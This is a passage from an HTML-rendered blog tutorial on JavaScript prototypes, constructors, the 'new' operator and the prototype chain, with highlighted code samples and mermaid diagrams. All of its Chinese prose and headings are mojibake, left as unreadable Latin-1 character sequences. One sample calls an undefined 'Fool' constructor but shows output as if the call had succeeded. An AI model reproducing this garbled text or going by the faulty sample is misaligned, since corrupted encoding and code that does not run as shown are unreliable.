class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// Hi, I&#x27;m Alice</span><br></code></pre></td></tr></table></figure><h2 id="2-3-é»˜è®¤åŸå‹ï¼šObject-prototype"><a href="#2-3-é»˜è®¤åŸå‹ï¼šObject-prototype" class="headerlink" title="2.3 é»˜è®¤åŸå‹ï¼šObject.prototype"></a>2.3 é»˜è®¤åŸå‹ï¼š<code>Object.prototype</code></h2><p>Object.prototype æ˜¯ JavaScript ä¸­æ‰€æœ‰å¯¹è±¡çš„ç»ˆæåŸå‹ï¼Œæ˜¯åŸå‹é“¾çš„é¡¶ç«¯ï¼ˆç»ˆç‚¹æ˜¯ nullï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>); <span class="hljs-comment">// null</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Fool</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(f.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) <span class="hljs-comment">// undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(f.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>å®ƒåŒ…å«æ‰€æœ‰å¯¹è±¡ç»§æ‰¿çš„åŸºæœ¬æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¸¸è§æ–¹æ³•</span><br>.<span class="hljs-title function_">toString</span>()<br>.<span class="hljs-title function_">valueOf</span>()<br>.<span class="hljs-title function_">hasOwnProperty</span>()<br>.<span class="hljs-title function_">isPrototypeOf</span>()<br></code></pre></td></tr></table></figure><p>é»˜è®¤ç»§æ‰¿å…³ç³»å¦‚ä¸‹ï¼š</p><pre class="mermaid">graph LR    A[ä½ çš„å¯¹è±¡] --> B[Object.prototype]    C[æ•°ç»„] --> D[Array.prototype] --> B    E[å‡½æ•°] --> F[Function.prototype] --> B    B --> G[null]</pre><h2 id="2-4-é€šè¿‡åŸå‹å…±äº«å±æ€§å’Œæ–¹æ³•"><a href="#2-4-é€šè¿‡åŸå‹å…±äº«å±æ€§å’Œæ–¹æ³•" class="headerlink" title="2.4 é€šè¿‡åŸå‹å…±äº«å±æ€§å’Œæ–¹æ³•"></a>2.4 é€šè¿‡åŸå‹å…±äº«å±æ€§å’Œæ–¹æ³•</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// å®ä¾‹å±æ€§ï¼ˆä¸å…±äº«ï¼‰</span><br>&#125;<br><br><span class="hljs-comment">// æ·»åŠ åˆ°prototypeçš„æ–¹æ³•ä¼šè¢«æ‰€æœ‰å®ä¾‹å…±äº«</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-keyword">const</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>);<br><br>p1.<span class="hljs-property">sayHello</span> === p2.<span class="hljs-property">sayHello</span> <span class="hljs-comment">// trueï¼ˆå…±äº«åŒä¸€æ–¹æ³•ï¼‰</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬ä¸‰ç« ï¼šæ„é€ å‡½æ•°ä¸å®ä¾‹"><a href="#ç¬¬ä¸‰ç« ï¼šæ„é€ å‡½æ•°ä¸å®ä¾‹" class="headerlink" title="ç¬¬ä¸‰ç« ï¼šæ„é€ å‡½æ•°ä¸å®ä¾‹"></a>ç¬¬ä¸‰ç« ï¼šæ„é€ å‡½æ•°ä¸å®ä¾‹</h1><h2 id="3-1-æ„é€ å‡½æ•°çš„ä½œç”¨ä¸å®šä¹‰"><a href="#3-1-æ„é€ å‡½æ•°çš„ä½œç”¨ä¸å®šä¹‰" class="headerlink" title="3.1 æ„é€ å‡½æ•°çš„ä½œç”¨ä¸å®šä¹‰"></a>3.1 æ„é€ å‡½æ•°çš„ä½œç”¨ä¸å®šä¹‰</h2><p><strong>ä½œç”¨</strong></p><ol><li>åˆ›å»ºå¯¹è±¡æ¨¡ç‰ˆï¼šå®šä¹‰ä¸€ç±»å¯¹è±¡çš„å…±åŒå±æ€§å’Œæ–¹æ³•</li><li>åˆå§‹åŒ–å¯¹è±¡çŠ¶æ€ï¼šä¸ºæ–°å¯¹è±¡è®¾ç½®åˆå§‹å±æ€§å€¼</li><li>å®ç°åŸå‹ç»§æ‰¿ï¼šé€šè¿‡ prototype å…±äº«å±æ€§å’Œæ–¹æ³•</li><li>ç±»å‹æ ‡è¯†ï¼šé€šè¿‡ instanceof è¯†åˆ«å¯¹è±¡ç±»å‹</li></ol><p><strong>å®šä¹‰æ–¹å¼</strong></p><p>ï¼ˆ1ï¼‰ä¼ ç»Ÿå®šä¹‰æ–¹å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-comment">// å®ä¾‹å±æ€§</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  <br>  <span class="hljs-comment">// ä¸æ¨èï¼šæ¯ä¸ªå®ä¾‹éƒ½ä¼šåˆ›å»ºæ–°å‡½æ•°</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// æ¨èï¼šå…±äº«æ–¹æ³•</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">introduce</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.age&#125;</span> years old`</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰class è¯­æ³•ç³–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  &#125;<br>  <br>  <span class="hljs-comment">// è‡ªåŠ¨æ·»åŠ åˆ°prototype</span><br>  <span class="hljs-title function_">introduce</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.age&#125;</span> years old`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š</p><ol><li>å‘½åçº¦å®šï¼šé¦–å­—æ¯å¤§å†™ï¼ˆå¦‚ Personï¼‰</li><li>å¿…é¡»ä»¥ <code>new</code> è°ƒç”¨ï¼šå¦åˆ™ <code>this</code> æŒ‡å‘å…¨å±€å¯¹è±¡ï¼ˆä¸¥æ ¼æ¨¡å¼ä¸‹ä¼šæŠ¥é”™ï¼‰</li><li>éšå¼è¿”å›ï¼šè‡ªåŠ¨è¿”å›æ–°å¯¹è±¡ï¼ˆé™¤éæ‰‹åŠ¨è¿”å›éåŸå§‹å€¼ï¼‰</li></ol><h2 id="3-2-new-æ“ä½œç¬¦çš„æ‰§è¡Œè¿‡ç¨‹"><a href="#3-2-new-æ“ä½œç¬¦çš„æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="3.2Â newÂ æ“ä½œç¬¦çš„æ‰§è¡Œè¿‡ç¨‹"></a>3.2Â <code>new</code>Â æ“ä½œç¬¦çš„æ‰§è¡Œè¿‡ç¨‹</h2><p>å½“ä½¿ç”¨ new è°ƒç”¨æ„é€ å‡½æ•°æ—¶ï¼ŒJavaScript å¼•æ“ä¼šå®Œæˆä»¥ä¸‹æ“ä½œï¼š</p><ol><li>éšå¼åˆ›å»ºæ–°å¯¹è±¡ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºå¯¹è±¡</li><li>è®¾ç½®åŸå‹é“¾æ¥ï¼šå°†è¯¥å¯¹è±¡çš„ <code>[[Prototype]]</code> å±æ€§ï¼ˆå³ <code>__proto__</code>ï¼‰é“¾æ¥åˆ°æ„é€ å‡½æ•°çš„ prototype å±æ€§</li><li>ç»‘å®š thisï¼šå°†æ–°å¯¹è±¡ç»‘å®šåˆ°æ„é€ å‡½æ•°å†…éƒ¨çš„ this ä¸Šä¸‹æ–‡</li><li>è‡ªåŠ¨è¿”å›ï¼š<ul><li>å¦‚æœæ„é€ å‡½æ•°æ²¡æœ‰æ˜¾å¼ return è¯­å¥ï¼Œè‡ªåŠ¨è¿”å›æ–°åˆ›å»ºçš„å¯¹è±¡</li><li>å¦‚æœ return éå¯¹è±¡ç±»å‹ï¼Œä»è¿”å›æ–°å¯¹è±¡ï¼ˆå¿½ç•¥ returnï¼‰</li><li>å¦‚æœ return å¯¹è±¡ç±»å‹ï¼Œåˆ™è¿”å›è¯¥å¯¹è±¡ï¼ˆè¦†ç›–é»˜è®¤è¡Œä¸ºï¼‰</li></ul></li></ol><p><strong>ä»£ç ç¤ºä¾‹</strong></p><p>ï¼ˆ1ï¼‰æ—  return è¯­å¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-comment">// æ—  return è¯­å¥</span><br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p); <span class="hljs-comment">// Person &#123; name: &quot;Alice&quot; &#125;ï¼ˆè¿”å›æ–°å¯¹è±¡ï¼‰</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰return éå¯¹è±¡ï¼ˆåŸå§‹å€¼ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">model</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">model</span> = model;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">123</span>; <span class="hljs-comment">// åŸå§‹å€¼è¢«å¿½ç•¥</span><br>&#125;<br><br><span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&#x27;Tesla&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c); <span class="hljs-comment">// Car &#123; model: &quot;Tesla&quot; &#125;ï¼ˆä»è¿”å›æ–°å¯¹è±¡ï¼‰</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰return å¯¹è±¡ç±»å‹ï¼ˆè¦†ç›–é»˜è®¤è¡Œä¸ºï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Default&quot;</span>;<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Override&quot;</span> &#125;; <span class="hljs-comment">// è¿”å›è¿™ä¸ªå¯¹è±¡</span><br>&#125;<br><br><span class="hljs-keyword">const</span> d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d); <span class="hljs-comment">// &#123; name: &quot;Override&quot; &#125;ï¼ˆä¸æ˜¯ Dog å®ä¾‹ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>å…³é”®æ³¨æ„äº‹é¡¹</strong></p><p>ï¼ˆ1ï¼‰å¿˜è®° new çš„åæœ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>); <span class="hljs-comment">// æ²¡æœ‰ new</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p); <span class="hljs-comment">// undefinedï¼ˆthis ä¼šæŒ‡å‘å…¨å±€å¯¹è±¡/æŠ¥é”™ï¼‰</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰é˜²å¾¡æ€§ç¼–ç¨‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-comment">// ç¡®ä¿æ„é€ å‡½æ•°è¢«æ­£ç¡®ä½¿ç”¨</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">new</span>.<span class="hljs-property">target</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(name); <span class="hljs-comment">// è‡ªåŠ¨è¡¥ new</span><br>  &#125;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-å®ä¾‹çš„-proto-ä¸æ„é€ å‡½æ•°çš„-prototype"><a href="#3-3-å®ä¾‹çš„-proto-ä¸æ„é€ å‡½æ•°çš„-prototype" class="headerlink" title="3.3 å®ä¾‹çš„Â __proto__Â ä¸æ„é€ å‡½æ•°çš„Â prototype"></a>3.3 å®ä¾‹çš„Â <code>__proto__</code>Â ä¸æ„é€ å‡½æ•°çš„Â <code>prototype</code></h2><p><strong>æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">prototype</th><th align="left"><code>__proto__</code></th></tr></thead><tbody><tr><td align="left">å½’å±</td><td align="left">å‡½æ•°å¯¹è±¡ç‰¹æœ‰</td><td align="left">æ‰€æœ‰å¯¹è±¡éƒ½æœ‰</td></tr><tr><td align="left">ä½œç”¨</td><td align="left">æ„é€ å‡½æ•°åˆ›å»ºå®ä¾‹æ—¶çš„åŸå‹æ¨¡æ¿</td><td align="left">å¯¹è±¡å®é™…ç»§æ‰¿çš„åŸå‹å¯¹è±¡</td></tr><tr><td align="left">è®¿é—®æ–¹å¼</td><td align="left">Constructor.prototype</td><td align="left">Object.getPrototypeOf(obj) æˆ– <code>obj.__proto__</code></td></tr><tr><td align="left">é»˜è®¤å€¼</td><td align="left">è‡ªåŠ¨åˆ›å»ºåŒ…å« constructor å±æ€§çš„å¯¹è±¡</td><td align="left">å–å†³äºå¯¹è±¡åˆ›å»ºæ–¹å¼</td></tr><tr><td align="left">æ ‡å‡†ç¨‹åº¦</td><td align="left">ESæ ‡å‡†å±æ€§</td><td align="left">éæ ‡å‡†ï¼Œå·²ç”±Object.getPrototypeOf()å–ä»£</td></tr></tbody></table><p><strong>ä¸¤è€…å…³ç³»å›¾è§£</strong></p><pre class="mermaid">graph LR    A[æ„é€ å‡½æ•° Constructor] -->|prototype å±æ€§| B[åŸå‹å¯¹è±¡ Prototype]    C[å®ä¾‹ instance] -->|"__proto__" é“¾æ¥| B    B -->|constructor å±æ€§| A    B -->|"__proto__"| D[Object.prototype]    D -->|"__proto__"| E[null]</pre><h2 id="3-4-constructor-å±æ€§çš„æ„ä¹‰"><a href="#3-4-constructor-å±æ€§çš„æ„ä¹‰" class="headerlink" title="3.4Â constructorÂ å±æ€§çš„æ„ä¹‰"></a>3.4Â <code>constructor</code>Â å±æ€§çš„æ„ä¹‰</h2><p>constructor æ˜¯åŸå‹å¯¹è±¡ä¸Šçš„ä¸€ä¸ªé‡è¦å±æ€§ï¼Œå®ƒæŒ‡å‘åˆ›å»ºå½“å‰å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚</p><p><strong>åŸºæœ¬ç‰¹æ€§</strong></p><p>ï¼ˆ1ï¼‰é»˜è®¤å­˜åœ¨äºæ‰€æœ‰å‡½æ•°å¯¹è±¡çš„ prototype ä¸Š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å®ä¾‹é€šè¿‡åŸå‹é“¾è®¿é—®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// trueï¼ˆé€šè¿‡åŸå‹é“¾è®¿é—®ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒä½œç”¨</strong></p><p>ï¼ˆ1ï¼‰æ ‡è¯†å¯¹è±¡æ¥æºï¼Œæä¾›è¿½è¸ªå¯¹è±¡æ˜¯ç”±å“ªä¸ªæ„é€ å‡½æ•°åˆ›å»ºçš„è·¯å¾„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å®ç°æ„é€ å‡½æ•°å¤ç”¨ï¼Œå¯ä»¥é€šè¿‡ constructor åˆ›å»ºæ–°å®ä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">make</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">make</span> = make;<br>&#125;<br><br><span class="hljs-keyword">const</span> toyota = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&#x27;Toyota&#x27;</span>);<br><span class="hljs-keyword">const</span> honda = <span class="hljs-keyword">new</span> toyota.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;Honda&#x27;</span></span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(honda.<span class="hljs-property">make</span>); <span class="hljs-comment">// &quot;Honda&quot;</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ç±»å‹æ£€æŸ¥çš„è¡¥å……</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkType</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> obj.<span class="hljs-property">constructor</span>.<span class="hljs-property">name</span>;<br>&#125;<br><span class="hljs-title function_">checkType</span>([]); <span class="hljs-comment">// &quot;Array&quot;</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬å››ç« ï¼šåŸå‹é“¾ï¼ˆPrototype-Chainï¼‰"><a href="#ç¬¬å››ç« ï¼šåŸå‹é“¾ï¼ˆPrototype-Chainï¼‰" class="headerlink" title="ç¬¬å››ç« ï¼šåŸå‹é“¾ï¼ˆPrototype Chainï¼‰"></a>ç¬¬å››ç« ï¼šåŸå‹é“¾ï¼ˆPrototype Chainï¼‰</h1><h2 id="4-1-åŸå‹é“¾çš„å½¢æˆæœºåˆ¶"><a href="#4-1-åŸå‹é“¾çš„å½¢æˆæœºåˆ¶" class="headerlink" title="4.1 åŸå‹é“¾çš„å½¢æˆæœºåˆ¶"></a>4.1 åŸå‹é“¾çš„å½¢æˆæœºåˆ¶</h2><p>åŸå‹é“¾ç”±å¯¹è±¡çš„ <code>__proto__</code> é“¾æ¥ä¸²è”è€Œæˆï¼Œå½¢æˆä¸€æ¡è®¿é—®å±æ€§å’Œæ–¹æ³•çš„æŸ¥æ‰¾è·¯å¾„</p><p><strong>åŸå‹é“¾æ ¸å¿ƒç»„ä»¶</strong></p><ol><li>å®ä¾‹å¯¹è±¡ï¼šåŒ…å«åŸºæœ¬æ•°æ®å’Œ <code>__proto__</code> é“¾æ¥</li><li>åŸå‹å¯¹è±¡ï¼šåŒ…å«å…±äº«å±æ€§å’Œæ–¹æ³•</li><li>é“¾å¼ç»“æ„ï¼šé€šè¿‡ <code>__proto__</code> é€çº§é“¾æ¥å½¢æˆï¼Œç»ˆç‚¹æ˜¯ null</li></ol><p><strong>å…·ä½“å½¢æˆè¿‡ç¨‹</strong></p><p>ï¼ˆ1ï¼‰æ„é€ å‡½æ•°åˆ›å»ºæ—¶çš„é»˜è®¤è®¾ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-comment">// è‡ªåŠ¨åˆ›å»ºçš„ prototype å¯¹è±¡</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-comment">/* &#123;</span><br><span class="hljs-comment"> *   constructor: Person,</span><br><span class="hljs-comment"> *   __proto__: Object.prototype</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>(2)å®ä¾‹åˆ›å»ºæ—¶çš„åŸå‹é“¾å»ºç«‹ï¼ˆ<code>new</code> æ“ä½œç¬¦æ‰§è¡Œè¿‡ç¨‹ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// å®ä¾‹çš„åŸå‹æŒ‡å‘æ„é€ å‡½æ•°çš„prototype</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(p) === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);             <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// åŸå‹å¯¹è±¡çš„constructoræŒ‡å›æ„é€ å‡½æ•°</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>);      <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>å›¾è§£</strong></p><pre class="mermaid">graph LR    A[å®ä¾‹] -->|__proto__| B[æ„é€ å‡½æ•°çš„prototype]    B -->|__proto__| C[Object.prototype]    C -->|__proto__| D[null]</pre><h2 